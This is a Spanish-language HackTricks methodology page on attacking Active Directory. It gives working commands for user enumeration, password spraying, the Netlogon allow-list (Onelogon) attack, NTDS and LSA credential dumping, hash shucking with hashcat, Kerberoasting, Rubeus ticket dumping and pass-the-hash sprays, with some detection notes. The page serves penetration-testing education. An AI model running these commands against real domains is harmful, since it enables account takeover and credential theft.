# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** sirve como una tecnología fundamental, permitiendo a los **network administrators** crear y gestionar de forma eficiente **domains**, **users** y **objects** dentro de una red. Está diseñado para escalar, facilitando la organización de un gran número de usuarios en **groups** y **subgroups** manejables, mientras controla los **access rights** en varios niveles.

La estructura de **Active Directory** se compone de tres capas principales: **domains**, **trees** y **forests**. Un **domain** abarca una colección de objetos, como **users** o **devices**, que comparten una base de datos común. Los **trees** son grupos de estos domains enlazados por una estructura compartida, y un **forest** representa la colección de múltiples trees, interconectados mediante **trust relationships**, formando la capa más alta de la estructura organizativa. Se pueden designar **access** y **communication rights** específicos en cada uno de estos niveles.

Los conceptos clave dentro de **Active Directory** incluyen:

1. **Directory** – Aloja toda la información relacionada con los objetos de Active Directory.
2. **Object** – Denota entidades dentro del directorio, incluidos **users**, **groups** o **shared folders**.
3. **Domain** – Sirve como contenedor para los objetos del directorio, con la capacidad de que múltiples domains coexistan dentro de un **forest**, manteniendo cada uno su propia colección de objetos.
4. **Tree** – Una agrupación de domains que comparten un domain raíz común.
5. **Forest** – La cúspide de la estructura organizativa en Active Directory, compuesta por varios trees con **trust relationships** entre ellos.

**Active Directory Domain Services (AD DS)** abarca una serie de servicios críticos para la gestión y comunicación centralizadas dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **users** y **domains**, incluidas las funcionalidades de **authentication** y **search**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de **digital certificates** seguros.
3. **Lightweight Directory Services** – Da soporte a aplicaciones habilitadas para directorio mediante el **LDAP protocol**.
4. **Directory Federation Services** – Proporciona capacidades de **single-sign-on** para autenticar usuarios en múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con copyright regulando su distribución y uso no autorizados.
6. **DNS Service** – Crucial para la resolución de **domain names**.

Para una explicación más detallada, consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender cómo **attack an AD** necesitas **understand** muy bien el **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puedes consultar mucho en [https://wadcoms.github.io/](https://wadcoms.github.io) para tener una vista rápida de qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos **requires a full qualifid name (FQDN)** para realizar acciones. Si intentas acceder a una máquina por la dirección IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Si solo tienes acceso a un entorno AD pero no tienes credenciales/sesiones, podrías:

- **Pentest the network:**
- Escanear la red, encontrar máquinas y puertos abiertos e intentar **exploit vulnerabilities** o **extract credentials** de ellas (por ejemplo, [las impresoras podrían ser objetivos muy interesantes](ad-information-in-printers.md).
- Enumerar DNS podría dar información sobre servidores clave en el domain como web, impresoras, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Echa un vistazo a la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) general para encontrar más información sobre cómo hacer esto.
- **Check for null and Guest access on smb services** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Aquí puedes encontrar una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Aquí puedes encontrar una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Obtener credenciales [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder al host mediante [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Obtener credenciales **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer usernames/names de documentos internos, redes sociales, servicios (principalmente web) dentro de los entornos del domain y también de los disponibles públicamente.
- Si encuentras los nombres completos de empleados de la empresa, puedes probar diferentes convenciones de **username ( [**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada uno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consulta las páginas [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Cuando se solicita un **invalid username**, el servidor responderá usando el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el username era inválido. Los **valid usernames** provocarán o bien el **TGT in a AS-REP** response o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que el usuario necesita realizar pre-autenticación.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra la interfaz MS-NRPC (Netlogon) en los domain controllers. El método llama a la función `DsrGetDcNameEx2` después de enlazar la interfaz MS-NRPC para comprobar si el user o computer existe sin ninguna credencial. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación se puede encontrar [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Si encontraste uno de estos servidores en la red, también puedes realizar **enumeración de usuarios contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  y esta otra ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener el **nombre de las personas que trabajan en la empresa** a partir del paso de recon que deberías haber realizado antes de esto. Con el nombre y el apellido podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles usernames válidos.

### Abuso de la allow-list del canal vulnerable de Netlogon (Onelogon)

Incluso después de que **Zerologon** se parchea en el DC, las cuentas explícitamente allow-listed aún pueden quedar expuestas al comportamiento heredado/vulnerable del secure-channel de **Netlogon**. La configuración riesgosa es la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o el valor de registro correspondiente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ese valor es un **descripor de seguridad SDDL** (ver [Security Descriptors](security-descriptors.md)). Cualquier cuenta o grupo al que se le conceda el ACE relevante en el DACL puede ser objetivo. Por ejemplo, `O:BAG:BAD:(A;;RC;;;WD)` permite efectivamente a **Everyone**.

Flujo práctico del operador:

1. **Identifica los principales allow-listed** comprobando tanto **SYSVOL/GPO** como el **registro en vivo del DC**.
2. **Resuelve los SIDs** encontrados en el SDDL a usuarios/equipos reales de AD y prioriza las **cuentas máquina de DC**, **cuentas de confianza** y otras máquinas privilegiadas.
3. Intenta repetidamente la **autenticación MS-NRPC / Netlogon** como la cuenta allow-listed.
4. Después de un intento exitoso, abusa del **Netlogon password-setting** para restablecer la contraseña de la cuenta objetivo (el PoC público la establece en una cadena vacía).

Ejemplos rápidos de triage / lab a partir del artefacto público:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- El **scanner** es útil porque la allow-list efectiva puede existir en **SYSVOL**, en el **registry**, o en ambos.
- La ruta de explotación en sí es importante porque **no requiere privilegios de Domain Admin** una vez que se ha identificado una cuenta vulnerable.
- Comprometer una cuenta de máquina de **Domain Controller** como `DC$` es especialmente peligroso porque restablecer esa contraseña puede habilitar directamente rutas más amplias de **AD takeover**.
- La viabilidad del **brute-force** depende del modo: el artefacto público describe un enfoque meet-in-the-middle, un **brute force de 24 bits** cuando hay disponible otra cuenta de equipo, y variantes más lentas de **32 bits**.

Notas de detección / hardening:

- Audita la política de allow-list y elimina todo excepto excepciones de compatibilidad temporales y explícitamente requeridas.
- Monitoriza los eventos **5827/5828/5829/5830/5831** del **System** de DC para detectar conexiones Netlogon vulnerables que sean denegadas, descubiertas o permitidas explícitamente por la política.
- Trata las cuentas en `VulnerableChannelAllowList` como de **alto riesgo** hasta que se elimine la dependencia heredada.

### Conocer uno o varios usernames

Vale, así que ya sabes que tienes un username válido pero no passwords... Entonces prueba:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_ puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá algunos datos cifrados por una derivación del password del usuario.
- [**Password Spraying**](password-spraying.md): Vamos a probar los passwords más **comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté usando un password débil (¡ten en cuenta la password policy!).
- Ten en cuenta que también puedes hacer **spray a servidores OWA** para intentar obtener acceso a los mail servers de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Puede que puedas **obtener** algunos challenge **hashes** para crackear **envenenando** algunos protocolos de la **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si has logrado enumerar el active directory, tendrás **más emails y una mejor comprensión de la network**. Puede que puedas forzar **relay attacks** de NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  para obtener acceso al entorno de AD.

### NetExec workspace-driven recon & relay posture checks

- Usa **`nxcdb` workspaces** para mantener el estado de la recon de AD por engagement: `workspace create <name>` crea SQLite DBs por protocolo bajo `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia de vista con `proto smb|mssql|winrm` y lista los secrets recopilados con `creds`. Elimina manualmente los datos sensibles cuando termines: `rm -rf ~/.nxc/workspaces/<name>`.
- El descubrimiento rápido de subredes con **`netexec smb <cidr>`** muestra **domain**, **OS build**, **SMB signing requirements** y **Null Auth**. Los miembros que muestran `(signing:False)` son propensos a **relay**, mientras que los DCs a menudo requieren signing.
- Genera **hostnames en /etc/hosts** directamente desde la salida de NetExec para facilitar el targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando el **SMB relay al DC está bloqueado** por signing, sigue comprobando la postura de **LDAP**: `netexec ldap <dc>` resalta `(signing:None)` / channel binding débil. Un DC con SMB signing requerido pero LDAP signing deshabilitado sigue siendo un objetivo viable de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Fugas de credenciales de impresoras en el lado cliente → validación masiva de credenciales de dominio

- A veces las UIs de impresoras/web **incrustan contraseñas de admin enmascaradas en HTML**. Ver el source/devtools puede revelar el cleartext (por ejemplo, `<input value="<password>">`), permitiendo acceso Basic-auth para explorar repositorios de scan/print.
- Los trabajos de impresión recuperados pueden contener **docs de onboarding en plaintext** con contraseñas por usuario. Mantén alineados los pares al probar:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Robar credenciales NTLM

Si puedes **acceder a otros PCs o shares** con el usuario **null o guest** podrías **colocar archivos** (como un archivo SCF) que, si se acceden de algún modo, harán **disparar una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking y ataques NT-Candidate

**Hash shucking** trata cada NT hash que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del NT hash. En lugar de brute-forcing passphrases largas en Kerberos RC4 tickets, NetNTLM challenges o credenciales cached, introduces los NT hashes en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin llegar a conocer el texto plano. Esto es especialmente potente tras un compromise de dominio, donde puedes recolectar miles de NT hashes actuales e históricos.

Usa shucking cuando:

- Tienes un corpus NT desde DCSync, volcados SAM/SECURITY o credential vaults y necesitas probar reutilización en otros domains/forests.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres demostrar rápidamente reutilización para passphrases largas e irrompibles y pivotar de inmediato vía Pass-the-Hash.

La técnica **no funciona** contra tipos de encriptación cuyas claves no son el NT hash (por ejemplo, Kerberos etype 17/18 AES). Si un domain exige solo AES, debes volver a los modos normales de passwords.

#### Construyendo un corpus de NT hash

- **DCSync/NTDS** – Usa `secretsdump.py` con history para obtener el mayor conjunto posible de NT hashes (y sus valores previos):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas de history amplían mucho el conjunto de candidatos porque Microsoft puede almacenar hasta 24 hashes previos por cuenta. Para más formas de extraer secretos NTDS, ver:

{{#ref}}
dcsync.md
{{#endref}}

- **Volcados de caché del endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales SAM/SECURITY y logons de dominio cached (DCC/DCC2). Elimina duplicados y añade esos hashes a la misma lista `nt_candidates.txt`.
- **Seguimiento de metadatos** – Conserva el username/domain que produjo cada hash (aunque la wordlist contenga solo hex). Los hashes coincidentes te dicen de inmediato qué principal está reutilizando una password cuando Hashcat imprime el candidato ganador.
- Prefiere candidatos del mismo forest o de un forest trusted; eso maximiza la probabilidad de solapamiento al hacer shucking.

#### Modos NT-candidate de Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Las entradas NT-candidate **deben seguir siendo NT hashes crudos de 32 hex**. Desactiva los rule engines (sin `-r`, sin hybrid modes) porque las transformaciones corrompen el material de la clave candidata.
- Estos modos no son inherentemente más rápidos, pero el keyspace NTLM (~30,000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista NT curada es mucho más barato que explorar todo el espacio de passwords en el formato lento.
- Ejecuta siempre la **última build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque los modos 31500/31600/35300/35400 son recientes.
- Actualmente no existe un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la password en texto plano porque sus claves se derivan mediante PBKDF2 a partir de passwords UTF-16LE, no de NT hashes crudos.

#### Ejemplo – Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario de bajos privilegios (consulta la página de Kerberoast para más detalles):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck el ticket con tu lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Un match confirma que la service account usa uno de tus NT hashes existentes.

3. Haz pivot de inmediato vía PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente puedes recuperar el texto plano más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Ejemplo – Credenciales cached (modo 31600)

1. Extrae logons cached de una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 del usuario de dominio interesante en `dcc2_highpriv.txt` y shuckea:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Un match exitoso devuelve el NT hash ya conocido en tu lista, demostrando que el usuario cached está reutilizando una password. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o crackéalo en modo NTLM rápido para recuperar la cadena.

El mismo flujo exacto aplica a NetNTLM challenge-responses (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificado un match puedes lanzar relay, SMB/WMI/WinRM PtH, o re-crackear el NT hash con masks/rules offline.



## Enumerando Active Directory CON credenciales/sesión

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes credenciales válidas o un shell como usuario de dominio, **debes recordar que las opciones dadas antes siguen siendo opciones para comprometer a otros usuarios**.

Antes de empezar la enumeración autenticada debes conocer cuál es el **Kerberos double hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Haber comprometido una cuenta es un **gran paso para empezar a comprometer todo el domain**, porque vas a poder empezar la **Active Directory Enumeration:**

Respecto a [**ASREPRoast**](asreproast.md), ahora puedes encontrar todo usuario posible vulnerable, y respecto a [**Password Spraying**](password-spraying.md) puedes obtener una **lista de todos los usernames** y probar la password de la cuenta comprometida, passwords vacías y nuevas passwords prometedoras.

- Podrías usar [**CMD para hacer un recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html), que será más stealthier
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta increíble para recon en active directory es [**BloodHound**](bloodhound.md). **No es muy stealthy** (dependiendo de los collection methods que uses), pero **si no te importa** eso, deberías probarla. Encuentra dónde pueden hacer RDP los users, encuentra paths hacia otros groups, etc.
- **Otras herramientas automatizadas de enumeración AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records del AD**](ad-dns-records.md) porque pueden contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directory es **AdExplorer.exe** de la suite **SysInternal**.
- También puedes buscar en la base de datos LDAP con **ldapsearch** para encontrar credenciales en los campos _userPassword_ & _unixUserPassword_, o incluso en _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para otros métodos.
- Si estás usando **Linux**, también podrías enumerar el domain usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- También podrías probar herramientas automáticas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extrayendo todos los usuarios del domain**

Es muy fácil obtener todos los usernames del domain desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Aunque esta sección de Enumeración parezca pequeña, es la parte más importante de todas. Abre los links (principalmente los de cmd, powershell, powerview y BloodHound), aprende a enumerar un domain y practica hasta sentirte cómodo. Durante una assessment, este será el momento clave para encontrar el camino a DA o decidir que no se puede hacer nada.

### Kerberoast

Kerberoasting implica obtener **TGS tickets** usados por services vinculados a cuentas de usuario y crackear su encriptación —que se basa en passwords de usuario— **offline**.

Más sobre esto en:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una vez que has obtenido algunas credenciales podrías comprobar si tienes acceso a alguna **máquina**. Para ello, podrías usar **CrackMapExec** para intentar conectarte a varios servers con diferentes protocolos, de acuerdo con tus port scans.

### Local Privilege Escalation

Si has comprometido credenciales o una sesión como un usuario de dominio normal y tienes **acceso** con este usuario a **cualquier máquina del domain** deberías intentar encontrar la forma de **escalar privilegios localmente y looting credenciales**. Esto es porque solo con privilegios de local administrator podrás **volcar hashes de otros usuarios** en memoria (LSASS) y localmente (SAM).

Hay una página completa en este libro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) y una [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Es **muy poco probable** que encuentres **tickets** en la sesión actual del usuario que te den permiso para acceder a recursos inesperados, pero puedes comprobar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has logrado enumerar active directory tendrás **más emails y un mejor entendimiento de la red**. Podrías forzar **relay attacks** de NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Busca Creds en Computer Shares | SMB Shares

Ahora que ya tienes algunas credenciales básicas deberías comprobar si puedes **encontrar** algún **archivo interesante compartido dentro del AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y más si encuentras cientos de docs que necesitas revisar).

[**Sigue este enlace para aprender sobre herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Robar NTLM Creds

Si puedes **acceder a otros PCs o shares** podrías **colocar archivos** (como un archivo SCF) que, si se acceden de alguna forma, t**trigger an NTLM authentication against you** para que puedas **robar** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalada de privilegios en Active Directory WITH privileged credentials/session

**Para las siguientes técnicas, un usuario normal de dominio no es suficiente; necesitas algunos privilegios/credenciales especiales para realizar estos ataques.**

### Extracción de hashes

Con suerte has logrado **comprometer alguna cuenta de local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluyendo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegios localmente](../windows-local-privilege-escalation/index.html).\
Entonces, es momento de volcar todos los hashes en memoria y localmente.\
[**Lee esta página sobre diferentes formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantarlo**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, para que cuando se realice cualquier **autenticación NTLM**, se use ese **hash**. La última opción es lo que hace mimikatz.\
[**Lee esta página para más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque busca **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo **Kerberos está permitido** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o valores hash. Luego, este ticket robado se usa para **suplantar al usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **contraseña** de un **local administrato**r deberías intentar **iniciar sesión localmente** en otros **PCs** con ello.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuse de MSSQL & Trusted Links

Si un usuario tiene privilegios para **acceder a instancias de MSSQL**, podría ser capaz de usarlas para **ejecutar comandos** en el host de MSSQL (si se ejecuta como SA), **robar** el **hash** NetNTLM o incluso realizar un **ataque relay**.\
Además, si una instancia de MSSQL es confiada (database link) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos confiada, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas se pueden encadenar y, en algún punto, el usuario podría encontrar una base de datos mal configurada donde pueda ejecutar comandos.\
**Los links entre bases de datos funcionan incluso a través de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse de plataformas de inventario/despliegue de IT

Las suites de inventario y despliegue de terceros a menudo exponen rutas potentes hacia credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar TGTs de la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation incluso podrías **comprometer automáticamente un Print Server** (con suerte será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o equipo se le अनुमति para "Constrained Delegation" podrá **impersonar a cualquier usuario para acceder a algunos servicios en un equipo**.\
Entonces, si **comprometes el hash** de este usuario/equipo podrás **impersonar a cualquier usuario** (incluso Domain Admins) para acceder a algunos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegio **WRITE** sobre un objeto de Active Directory de un equipo remoto permite conseguir ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse de Permissions/ACLs

El usuario comprometido podría tener algunos **privilegios interesantes sobre algunos objetos de dominio** que podrían permitirte **moverte** lateralmente/**escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse del servicio Printer Spooler

Descubrir un **servicio Spool en escucha** dentro del dominio puede **abusarse** para **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

